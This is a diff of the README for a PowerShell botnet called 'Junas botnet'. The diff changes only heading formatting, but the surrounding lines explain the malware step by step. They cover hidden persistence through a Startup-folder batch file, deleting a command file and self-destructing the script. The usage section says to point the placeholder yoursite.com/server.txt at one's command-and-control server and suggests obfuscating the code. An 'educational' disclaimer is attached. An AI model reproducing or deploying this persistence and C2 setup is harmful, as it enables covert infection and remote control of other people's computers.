@@ -1,9 +1,9 @@
 ## Junas botnet
-<br> #### Legal #
+<br> *Legal*
 <br> This is an educational script and should not be used for illegal/unethical actions against machines you do not own/have permission to infect
 <br> 
 <br> *Copyright (c) 2021 Pokesi All Rights Reserved.*
-<br> ### How it works **step by step**
+<br> *How it works **step by step***
 <br> Syntax used:
 <br> `Line of code/variable` - Explanation
 <br> ... `Line of code` - Explanation [not required]
@@ -54,6 +54,6 @@
 <br> ... `Remove-Item -Path "./command.txt";` - Removes command.txt
 <br> `"powershell -WindowStyle hidden -Command '$botnetCode'" | Out-File "$startUpFolder\default.bat";` - Writes `$botnetCode` to a Startup file.
 <br> `Remove-Item -Path $MyInvocation.MyCommand.Source;` - Self-Destructs.
-<br> ### Usage
+<br> *Usage*
 <br> Change https://yoursite.com/server.txt to your command and control server.
 <br> You may want to obfuscate this or add custom commands.
